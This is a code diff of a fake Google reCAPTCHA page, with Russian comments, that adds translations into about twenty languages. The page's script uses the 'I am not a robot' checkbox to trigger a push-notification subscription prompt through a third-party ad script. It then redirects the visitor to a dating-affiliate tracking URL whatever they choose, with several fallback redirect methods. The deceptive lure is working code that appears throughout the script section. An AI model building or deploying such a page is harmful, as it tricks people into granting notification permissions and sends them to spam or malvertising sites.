@@ -1,140 +1,172 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
     <title>reCAPTCHA</title>
     <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            background-color: #f9f9f9;
-            overflow: hidden; /* Отключаем прокрутку */
+    body {
+        font-family: 'Roboto', Arial, sans-serif;
+        margin: 0;
+        background-color: #f9f9f9;
+        overflow: hidden;
+    }
+    .container {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+    }
+    .captcha-container {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 300px;
+        padding: 10px;
+        border: 1px solid #dfe1e5;
+        border-radius: 4px;
+        background-color: #fff;
+    }
+    /* Увеличиваем ширину контейнера для языков с длинными текстами */
+    .captcha-container[lang="el"], 
+    .captcha-container[lang="ps"], 
+    .captcha-container[lang="ur"], 
+    .captcha-container[lang="tl"] {
+        width: 320px;
+    }
+    .captcha-left {
+        display: flex;
+        align-items: center;
+    }
+    .captcha-checkbox {
+        margin-right: 10px;
+        width: 20px;
+        height: 20px;
+        cursor: pointer;
+        border: 2px solid #000;
+        background-color: transparent;
+        position: relative;
+        appearance: none;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+    }
+    .captcha-checkbox.loading {
+        border: none;
+        background-color: transparent;
+    }
+    .captcha-checkbox.loading::before {
+        content: '';
+        width: 20px;
+        height: 20px;
+        border: 3px solid #1a73e8;
+        border-top-color: transparent;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        animation: spin 0.8s linear infinite;
+    }
+    .captcha-checkbox.completed {
+        border: none;
+        background-color: transparent;
+    }
+    .captcha-checkbox.completed::before {
+        content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 28 28" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: block;
+    }
+    @keyframes spin {
+        0% {
+            transform: translate(-50%, -50%) rotate(0deg);
         }
-        .container {
-            position: fixed; /* Фиксируем позицию */
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%); /* Центрируем по обоим осям */
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 10px;
+        100% {
+            transform: translate(-50%, -50%) rotate(360deg);
         }
-        .captcha-container {
-	    display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 300px;
-            padding: 10px;
-            border: 1px solid #dfe1e5;
-            border-radius: 4px;
-            background-color: #fff;
-	}
-        .captcha-left {
-            display: flex;
-            align-items: center;
-        }
-        .captcha-checkbox {
-            margin-right: 10px;
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-            border: 2px solid #000; /* Черная окантовка */
-            background-color: transparent; /* Прозрачный фон */
-            position: relative;
-            appearance: none;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-        }
-        .captcha-checkbox.loading {
-            border: none; /* Убираем рамку во время загрузки */
-            background-color: transparent;
-        }
-        .captcha-checkbox.loading::before {
-            content: '';
-            width: 20px;
-            height: 20px;
-            border: 3px solid #1a73e8; /* Приятный синий цвет */
-            border-top-color: transparent;
-            border-radius: 50%;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: spin 0.8s linear infinite;
-        }
-        .captcha-checkbox.completed {
-            border: none; /* Убираем рамку */
-            background-color: transparent;
-        }
-        .captcha-checkbox.completed::before {
-            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: block;
-        }
-        @keyframes spin {
-            0% {
-                transform: translate(-50%, -50%) rotate(0deg);
-            }
-            100% {
-                transform: translate(-50%, -50%) rotate(360deg);
-            }
-        }
-        .captcha-text {
-            font-size: 14px;
-            color: #000;
-        }
-        .captcha-right {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        .captcha-logo {
-            width: 20px;
-            height: 20px;
-            margin-bottom: 5px;
-        }
-        .captcha-brand {
-            font-size: 12px;
-            color: #757575;
-        }
-        .captcha-links {
-            font-size: 10px;
-            color: #757575;
-        }
-        .captcha-links a {
-            color: #757575;
-            text-decoration: none;
-        }
-        .submit-button {
-            padding: 8px 16px;
-            background-color: #f1f3f4;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 14px;
-            color: #202124;
-            cursor: pointer;
-        }
-        .submit-button:hover {
-            background-color: #e8eaed;
-        }
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .error {
-            color: red;
-            font-size: 12px;
-            display: none;
-            margin-top: 5px;
-        }
-    </style>
+    }
+    .captcha-text {
+        font-size: 13px; /* Уменьшен с 14px */
+        color: #000;
+        white-space: nowrap; /* Запрещаем перенос */
+    }
+    /* Уменьшаем шрифт для языков с длинными переводами */
+    [lang="el"] .captcha-text, 
+    [lang="ps"] .captcha-text, 
+    [lang="ur"] .captcha-text, 
+    [lang="tl"] .captcha-text {
+        font-size: 12px;
+    }
+    .captcha-right {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+    }
+    .captcha-logo {
+        width: 20px;
+        height: 20px;
+        margin-bottom: 5px;
+    }
+    .captcha-brand {
+        font-size: 11px; /* Уменьшен с 12px */
+        color: #757575;
+    }
+    .captcha-links {
+        font-size: 9px; /* Уменьшен с 10px */
+        color: #757575;
+    }
+    .captcha-links a {
+        color: #757575;
+        text-decoration: none;
+    }
+    .submit-button {
+        padding: 8px 16px;
+        background-color: #f1f3f4;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 13px; /* Уменьшен с 14px */
+        color: #202124;
+        cursor: pointer;
+        white-space: nowrap; /* Запрещаем перенос */
+    }
+    /* Уменьшаем шрифт кнопки для языков с длинными переводами */
+    [lang="el"] .submit-button, 
+    [lang="ps"] .submit-button, 
+    [lang="ur"] .submit-button, 
+    [lang="tl"] .submit-button {
+        font-size: 12px;
+    }
+    .submit-button:hover {
+        background-color: #e8eaed;
+    }
+    .button-container {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    .error {
+        color: red;
+        font-size: 11px; /* Уменьшен с 12px */
+        display: none;
+        margin-top: 5px;
+        white-space: nowrap; /* Запрещаем перенос */
+    }
+    /* Поддержка RTL для арабского и урду */
+    body[lang="ar"], body[lang="ur"] {
+        direction: rtl;
+        text-align: right;
+    }
+    .captcha-container[lang="ar"], .captcha-container[lang="ur"] {
+        flex-direction: row-reverse;
+    }
+</style>
 </head>
 <body>
     <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
@@ -142,214 +174,432 @@
         <div class="captcha-container">
             <div class="captcha-left">
                 <input type="checkbox" id="captcha" class="captcha-checkbox">
-                <span class="captcha-text">Я не робот</span>
+                <span class="captcha-text">I am not a robot</span>
             </div>
             <div class="captcha-right">
                 <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                 <span class="captcha-brand">reCAPTCHA</span>
                 <div class="captcha-links">
-                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
-                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
+                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Privacy</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Terms</a>
                 </div>
             </div>
         </div>
         <div class="button-container">
-            <button class="submit-button" id="submit-button">Отправить</button>
-            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
+            <button class="submit-button" id="submit-button">Submit</button>
+            <div class="error" id="error">Please verify that you are not a robot.</div>
         </div>
     </div>
 
-    <script>
-        // Ссылка для редиректа
-        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd31';
+<script>
+// Определение языка браузера
+const userLanguage = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
+const supportedLanguages = ['ru', 'en', 'es', 'fr', 'de', 'it', 'pt', 'zh', 'ja', 'ko', 'ar', 'hi', 'tr', 'uk', 'hu', 'el', 'tl', 'ur', 'nl', 'ps', 'id'];
+const lang = supportedLanguages.includes(userLanguage) ? userLanguage : 'en';
+console.log('Определен язык:', lang); // Для отладки
 
-        // Функция для логирования подписки
-        function logSubscription(permission, subId = 'test_campaign') {
-            const data = {
-                id: 'HnFv7gIgUEyhZsQd8kp20Q',
-                sub_id: subId,
-                permission: permission,
-                timestamp: new Date().toISOString()
-            };
-            console.log('Лог подписки:', data);
+// Объект с переводами
+const translations = {
+    ru: {
+        title: 'reCAPTCHA',
+        captchaText: 'Я не робот',
+        submitButton: 'Отправить',
+        error: 'Пожалуйста, подтвердите, что вы не робот.',
+        privacy: 'Конфиденциальность',
+        terms: 'Условия',
+        redirectError: 'Не удалось выполнить редирект. <a href="{url}">Перейдите по ссылке</a>'
+    },
+    en: {
+        title: 'reCAPTCHA',
+        captchaText: 'I am not a robot',
+        submitButton: 'Submit',
+        error: 'Please verify that you are not a robot.',
+        privacy: 'Privacy',
+        terms: 'Terms',
+        redirectError: 'Unable to perform redirect. <a href="{url}">Follow the link</a>'
+    },
+    es: {
+        title: 'reCAPTCHA',
+        captchaText: 'No soy un robot',
+        submitButton: 'Enviar',
+        error: 'Por favor, verifica que no eres un robot.',
+        privacy: 'Privacidad',
+        terms: 'Términos',
+        redirectError: 'No se pudo realizar la redirección. <a href="{url}">Sigue el enlace</a>'
+    },
+    fr: {
+        title: 'reCAPTCHA',
+        captchaText: 'Je ne suis pas un robot',
+        submitButton: 'Envoyer',
+        error: 'Veuillez vérifier que vous n\'êtes pas un robot.',
+        privacy: 'Confidentialité',
+        terms: 'Conditions',
+        redirectError: 'Impossible d\'effectuer la redirection. <a href="{url}">Suivez le lien</a>'
+    },
+    de: {
+        title: 'reCAPTCHA',
+        captchaText: 'Ich bin kein Roboter',
+        submitButton: 'Absenden',
+        error: 'Bitte bestätigen Sie, dass Sie kein Roboter sind.',
+        privacy: 'Datenschutz',
+        terms: 'Nutzungsbedingungen',
+        redirectError: 'Weiterleitung nicht möglich. <a href="{url}">Folgen Sie dem Link</a>'
+    },
+    it: {
+        title: 'reCAPTCHA',
+        captchaText: 'Non sono un robot',
+        submitButton: 'Invia',
+        error: 'Per favore, verifica di non essere un robot.',
+        privacy: 'Privacy',
+        terms: 'Termini',
+        redirectError: 'Impossibile eseguire il reindirizzamento. <a href="{url}">Segui il link</a>'
+    },
+    pt: {
+        title: 'reCAPTCHA',
+        captchaText: 'Não sou um robô',
+        submitButton: 'Enviar',
+        error: 'Por favor, confirme que você não é um robô.',
+        privacy: 'Privacidade',
+        terms: 'Termos',
+        redirectError: 'Não foi possível realizar o redirecionamento. <a href="{url}">Siga o link</a>'
+    },
+    zh: {
+        title: 'reCAPTCHA',
+        captchaText: '我不是机器人',
+        submitButton: '提交',
+        error: '请验证您不是机器人。',
+        privacy: '隐私',
+        terms: '条款',
+        redirectError: '无法执行重定向。<a href="{url}">点击链接</a>'
+    },
+    ja: {
+        title: 'reCAPTCHA',
+        captchaText: '私はロボットではありません',
+        submitButton: '送信',
+        error: 'ロボットでないことを確認してください。',
+        privacy: 'プライバシー',
+        terms: '利用規約',
+        redirectError: 'リダイレクトできませんでした。<a href="{url}">リンクをクリック</a>'
+    },
+    ko: {
+        title: 'reCAPTCHA',
+        captchaText: '나는 로봇이 아닙니다',
+        submitButton: '제출',
+        error: '로봇이 아님을 확인해 주세요.',
+        privacy: '개인정보',
+        terms: '약관',
+        redirectError: '리디렉션을 수행할 수 없습니다. <a href="{url}">링크를 클릭하세요</a>'
+    },
+    ar: {
+        title: 'reCAPTCHA',
+        captchaText: 'أنا لست روبوتًا',
+        submitButton: 'إرسال',
+        error: 'يرجى التحقق من أنك لست روبوتًا.',
+        privacy: 'الخصوصية',
+        terms: 'الشروط',
+        redirectError: 'تعذر إجراء إعادة التوجيه. <a href="{url}">اتبع الرابط</a>'
+    },
+    hi: {
+        title: 'reCAPTCHA',
+        captchaText: 'मैं रोबोट नहीं हूँ',
+        submitButton: 'जमा करें',
+        error: 'कृपया सत्यापित करें कि आप रोबोट नहीं हैं।',
+        privacy: 'गोपनीयता',
+        terms: 'शर्तें',
+        redirectError: 'रीडायरेक्ट करने में असमर्थ। <a href="{url}">लिंक का पालन करें</a>'
+    },
+    tr: {
+        title: 'reCAPTCHA',
+        captchaText: 'Robot değilim',
+        submitButton: 'Gönder',
+        error: 'Lütfen robot olmadığınızı doğrulayın.',
+        privacy: 'Gizlilik',
+        terms: 'Şartlar',
+        redirectError: 'Yönlendirme yapılamadı. <a href="{url}">Bağlantıyı takip edin</a>'
+    },
+    uk: {
+        title: 'reCAPTCHA',
+        captchaText: 'Я не робот',
+        submitButton: 'Надіслати',
+        error: 'Будь ласка, підтвердьте, що ви не робот.',
+        privacy: 'Конфіденційність',
+        terms: 'Умови',
+        redirectError: 'Не вдалося виконати перенаправлення. <a href="{url}">Перейдіть за посиланням</a>'
+    },
+    hu: {
+        title: 'reCAPTCHA',
+        captchaText: 'Nem vagyok robot',
+        submitButton: 'Küldés',
+        error: 'Kérjük, erősítse meg, hogy nem robot.',
+        privacy: 'Adatvédelem',
+        terms: 'Feltételek',
+        redirectError: 'Nem sikerült az átirányítás. <a href="{url}">Kattintson a linkre</a>'
+    },
+    el: {
+        title: 'reCAPTCHA',
+        captchaText: 'Δεν είμαι ρομπότ',
+        submitButton: 'Υποβολή',
+        error: 'Παρακαλώ επαληθεύστε ότι δεν είστε ρομπότ.',
+        privacy: 'Απόρρητο',
+        terms: 'Όροι',
+        redirectError: 'Δεν ήταν δυνατή η ανακατεύθυνση. کامپیوتر <a href="{url}">Ακολουθήστε τον σύνδεσμο</a>'
+    },
+    tl: {
+        title: 'reCAPTCHA',
+        captchaText: 'Hindi ako robot',
+        submitButton: 'Ipasa',
+        error: 'Paki-verify na hindi ka robot.',
+        privacy: 'Privacy',
+        terms: 'Mga Tuntunin',
+        redirectError: 'Hindi ma-redirect. <a href="{url}">Sundan ang link</a>'
+    },
+    ur: {
+        title: 'reCAPTCHA',
+        captchaText: 'میں روبوٹ نہیں ہوں',
+        submitButton: 'جمع کرائیں',
+        error: 'براہ کرم تصدیق کریں کہ آپ روبوٹ نہیں ہیں۔',
+        privacy: 'رازداری',
+        terms: 'شرائط',
+        redirectError: 'ری ڈائریکٹ کرنے میں ناکام۔ <a href="{url}">لنک پر عمل کریں</a>'
+    },
+    nl: {
+        title: 'reCAPTCHA',
+        captchaText: 'Ik ben geen robot',
+        submitButton: 'Verzenden',
+        error: 'Controleer of u geen robot bent.',
+        privacy: 'Privacy',
+        terms: 'Voorwaarden',
+        redirectError: 'Doorverwijzing mislukt. <a href="{url}">Volg de link</a>'
+    },
+    ps: {
+        title: 'reCAPTCHA',
+        captchaText: 'زه روبوټ نه یم',
+        submitButton: 'سپارل',
+        error: 'مهرباني وکړئ تصدیق کړئ چې تاسو روبوټ نه یاست.',
+        privacy: 'محرمیت',
+        terms: 'شرایط',
+        redirectError: 'ری ڈائریکشن ناکام شو. <a href="{url}">لنک تعقیب کړئ</a>'
+    },
+    id: {
+        title: 'reCAPTCHA',
+        captchaText: 'Saya bukan robot',
+        submitButton: 'Kirim',
+        error: 'Harap verifikasi bahwa Anda bukan robot.',
+        privacy: 'Privasi',
+        terms: 'Syarat',
+        redirectError: 'Gagal melakukan pengalihan. <a href="{url}">Ikuti tautan</a>'
+    }
+};
+
+// Функция для применения переводов
+function applyTranslations() {
+    try {
+        document.documentElement.lang = lang;
+        document.title = translations[lang].title;
+        document.querySelector('.captcha-text').textContent = translations[lang].captchaText;
+        document.getElementById('submit-button').textContent = translations[lang].submitButton;
+        document.getElementById('error').textContent = translations[lang].error;
+        document.getElementById('privacy-link').textContent = translations[lang].privacy;
+        document.getElementById('terms-link').textContent = translations[lang].terms;
+        console.log('Переводы применены для языка:', lang); // Для отладки
+    } catch (e) {
+        console.error('Ошибка при применении переводов:', e);
+    }
+}
+
+// Применяем переводы сразу
+applyTranslations();
+
+// Ссылка для редиректа
+const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd31';
+
+// Функция для логирования подписки
+function logSubscription(permission, subId = 'test_campaign') {
+    const data = {
+        id: 'HnFv7gIgUEyhZsQd8kp20Q',
+        sub_id: subId,
+        permission: permission,
+        timestamp: new Date().toISOString()
+    };
+    console.log('Лог подписки:', data);
+}
+
+// Функция для выполнения редиректа
+function performRedirect() {
+    console.log('Попытка редиректа на:', redirectUrl);
+    try {
+        const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
+        if (isWebView) {
+            console.log('Обнаружен WebView, используем location.assign');
+            window.location.assign(redirectUrl);
+        } else {
+            console.log('Стандартный редирект через location.href');
+            window.location.href = redirectUrl;
         }
-
-        // Функция для выполнения редиректа
-        function performRedirect() {
-            console.log('Попытка редиректа на:', redirectUrl);
-            try {
-                const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
-                if (isWebView) {
-                    console.log('Обнаружен WebView, используем location.assign');
-                    window.location.assign(redirectUrl);
-                } else {
-                    console.log('Стандартный редирект через location.href');
-                    window.location.href = redirectUrl;
-                }
-                setTimeout(() => {
-                    if (window.location.href !== redirectUrl) {
-                        console.log('Резервный редирект через location.replace');
-                        window.location.replace(redirectUrl);
-                    }
-                }, 500);
-            } catch (e) {
-                console.error('Ошибка редиректа:', e);
-                try {
-                    console.log('Попытка редиректа через программный клик');
-                    const link = document.createElement('a');
-                    link.href = redirectUrl;
-                    link.style.display = 'none';
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                } catch (clickError) {
-                    console.error('Ошибка программного клика:', clickError);
-                    const error = document.getElementById('error');
-                    error.innerHTML = `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`;
-                    error.style.display = 'block';
-                }
+        setTimeout(() => {
+            if (window.location.href !== redirectUrl) {
+                console.log('Резервный редирект через location.replace');
+                window.location.replace(redirectUrl);
             }
+        }, 500);
+    } catch (e) {
+        console.error('Ошибка редиректа:', e);
+        try {
+            console.log('Попытка редиректа через программный клик');
+            const link = document.createElement('a');
+            link.href = redirectUrl;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        } catch (clickError) {
+            console.error('Ошибка программного клика:', clickError);
+            const error = document.getElementById('error');
+            error.innerHTML = translations[lang].redirectError.replace('{url}', redirectUrl);
+            error.style.display = 'block';
+        }
+    }
+}
+
+// Функция для ожидания загрузки ps.js
+function waitForPsJs(maxAttempts = 10, interval = 500) {
+    return new Promise((resolve, reject) => {
+        let attempts = 0;
+        const checkPs = () => {
+            if (window.ps && typeof window.ps.showPrompt === 'function') {
+                console.log('ps.js загружен успешно');
+                resolve();
+            } else if (attempts >= maxAttempts) {
+                console.error('ps.js не загружен после максимального количества попыток');
+                reject(new Error('ps.js not loaded'));
+            } else {
+                attempts++;
+                console.log(`Ожидание ps.js, попытка ${attempts}/${maxAttempts}`);
+                setTimeout(checkPs, interval);
+            }
+        };
+        checkPs();
+    });
+}
+
+// Функция для запроса подписки
+function requestSubscription(checkbox) {
+    console.log('Запуск requestSubscription');
+    try {
+        if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+            console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
+            logSubscription(Notification.permission);
+            checkbox.classList.remove('loading');
+            checkbox.classList.add('completed');
+            setTimeout(() => {
+                console.log('Запуск редиректа после галочки');
+                performRedirect();
+            }, 1000);
+            return;
         }
 
-        // Функция для ожидания загрузки ps.js
-        function waitForPsJs(maxAttempts = 10, interval = 500) {
-            return new Promise((resolve, reject) => {
-                let attempts = 0;
-                const checkPs = () => {
-                    if (window.ps && typeof window.ps.showPrompt === 'function') {
-                        console.log('ps.js загружен успешно');
-                        resolve();
-                    } else if (attempts >= maxAttempts) {
-                        console.error('ps.js не загружен после максимального количества попыток');
-                        reject(new Error('ps.js not loaded'));
-                    } else {
-                        attempts++;
-                        console.log(`Ожидание ps.js, попытка ${attempts}/${maxAttempts}`);
-                        setTimeout(checkPs, interval);
-                    }
-                };
-                checkPs();
-            });
-        }
-
-        // Функция для запроса подписки
-        function requestSubscription(checkbox) {
-            console.log('Запуск requestSubscription');
-            try {
-                if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
-                    console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
-                    logSubscription(Notification.permission);
-                    checkbox.classList.remove('loading');
-                    checkbox.classList.add('completed');
-                    setTimeout(() => {
-                        console.log('Запуск редиректа после галочки');
-                        performRedirect();
-                    }, 1000);
-                    return;
-                }
-
-                waitForPsJs()
-                    .then(() => {
-                        console.log('Вызываем подписку через ps.js');
-                        window.ps.showPrompt()
-                            .then(result => {
-                                console.log('Результат подписки:', result);
-                                logSubscription(Notification.permission);
-                                checkbox.classList.remove('loading');
-                                checkbox.classList.add('completed');
-                                setTimeout(() => {
-                                    console.log('Запуск редиректа после галочки');
-                                    performRedirect();
-                                }, 1000);
-                            })
-                            .catch(err => {
-                                console.error('Ошибка вызова подписки:', err);
-                                logSubscription(Notification.permission);
-                                checkbox.classList.remove('loading');
-                                checkbox.classList.add('completed');
-                                setTimeout(() => {
-                                    console.log('Запуск редиректа после галочки');
-                                    performRedirect();
-                                }, 1000);
-                            });
+        waitForPsJs()
+            .then(() => {
+                console.log('Вызываем подписку через ps.js');
+                window.ps.showPrompt()
+                    .then(result => {
+                        console.log('Результат подписки:', result);
+                        logSubscription(Notification.permission);
+                        checkbox.classList.remove('loading');
+                        checkbox.classList.add('completed');
+                        setTimeout(() => {
+                            console.log('Запуск редиректа после галочки');
+                            performRedirect();
+                        }, 1000);
                     })
-                    .catch(() => {
-                        console.log('API ps.js не доступен, пробуем Notification API');
-                        if ('Notification' in window) {
-                            Notification.requestPermission()
-                                .then(permission => {
-                                    console.log('Результат разрешения:', permission);
-                                    logSubscription(permission);
-                                    checkbox.classList.remove('loading');
-                                    checkbox.classList.add('completed');
-                                    setTimeout(() => {
-                                        console.log('Запуск редиректа после галочки');
-                                        performRedirect();
-                                    }, 1000);
-                                })
-                                .catch(err => {
-                                    console.error('Ошибка Notification API:', err);
-                                    logSubscription('error');
-                                    checkbox.classList.remove('loading');
-                                    checkbox.classList.add('completed');
-                                    setTimeout(() => {
-                                        console.log('Запуск редиректа после галочки');
-                                        performRedirect();
-                                    }, 1000);
-                                });
-                        } else {
-                            console.log('Уведомления не поддерживаются');
-                            logSubscription('unsupported');
+                    .catch(err => {
+                        console.error('Ошибка вызова подписки:', err);
+                        logSubscription(Notification.permission);
+                        checkbox.classList.remove('loading');
+                        checkbox.classList.add('completed');
+                        setTimeout(() => {
+                            console.log('Запуск редиректа после галочки');
+                            performRedirect();
+                        }, 1000);
+                    });
+            })
+            .catch(() => {
+                console.log('API ps.js не доступен, пробуем Notification API');
+                if ('Notification' in window) {
+                    Notification.requestPermission()
+                        .then(permission => {
+                            console.log('Результат разрешения:', permission);
+                            logSubscription(permission);
                             checkbox.classList.remove('loading');
                             checkbox.classList.add('completed');
                             setTimeout(() => {
                                 console.log('Запуск редиректа после галочки');
                                 performRedirect();
                             }, 1000);
-                        }
-                    });
-            } catch (e) {
-                console.error('Общая ошибка в requestSubscription:', e);
-                logSubscription('error');
-                checkbox.classList.remove('loading');
-                checkbox.classList.add('completed');
-                setTimeout(() => {
-                    console.log('Запуск редиректа после галочки');
-                    performRedirect();
-                }, 1000);
-            }
-        }
+                        })
+                        .catch(err => {
+                            console.error('Ошибка Notification API:', err);
+                            logSubscription('error');
+                            checkbox.classList.remove('loading');
+                            checkbox.classList.add('completed');
+                            setTimeout(() => {
+                                console.log('Запуск редиректа после галочки');
+                                performRedirect();
+                            }, 1000);
+                        });
+                } else {
+                    console.log('Уведомления не поддерживаются');
+                    logSubscription('unsupported');
+                    checkbox.classList.remove('loading');
+                    checkbox.classList.add('completed');
+                    setTimeout(() => {
+                        console.log('Запуск редиректа после галочки');
+                        performRedirect();
+                    }, 1000);
+                }
+            });
+    } catch (e) {
+        console.error('Общая ошибка в requestSubscription:', e);
+        logSubscription('error');
+        checkbox.classList.remove('loading');
+        checkbox.classList.add('completed');
+        setTimeout(() => {
+            console.log('Запуск редиректа после галочки');
+            performRedirect();
+        }, 1000);
+    }
+}
 
-        // Функция проверки
-        function verify() {
-            const checkbox = document.getElementById('captcha');
-            const error = document.getElementById('error');
-            if (checkbox.checked) {
-                console.log('Чекбокс отмечен, запускаем подписку');
-                error.style.display = 'none';
-                checkbox.disabled = true; // Блокируем чекбокс
-                checkbox.classList.add('loading'); // Показываем лоадер
-                requestSubscription(checkbox);
-                checkbox.disabled = false; // Разблокируем после обработки
-            } else {
-                error.style.display = 'block';
-            }
-        }
+// Функция проверки
+function verify() {
+    const checkbox = document.getElementById('captcha');
+    const error = document.getElementById('error');
+    if (checkbox.checked) {
+        console.log('Чекбокс отмечен, запускаем подписку');
+        error.style.display = 'none';
+        checkbox.disabled = true;
+        checkbox.classList.add('loading');
+        requestSubscription(checkbox);
+        checkbox.disabled = false;
+    } else {
+        error.style.display = 'block';
+    }
+}
 
-        // События
-        document.getElementById('captcha').addEventListener('click', () => {
-            console.log('Чекбокс кликнут');
-            const checkbox = document.getElementById('captcha');
-            if (!checkbox.checked) {
-                checkbox.checked = true; // Принудительно устанавливаем галочку
-            }
-            verify();
-        });
+// События
+document.getElementById('captcha').addEventListener('click', () => {
+    console.log('Чекбокс кликнут');
+    const checkbox = document.getElementById('captcha');
+    if (!checkbox.checked) {
+        checkbox.checked = true;
+    }
+    verify();
+});
 
-        document.getElementById('submit-button').addEventListener('click', () => {
-            console.log('Нажата кнопка Отправить');
-            verify();
-        });
-    </script>
+document.getElementById('submit-button').addEventListener('click', () => {
+    console.log('Нажата кнопка Отправить');
+    verify();
+});
+</script>
 </body>
 </html>
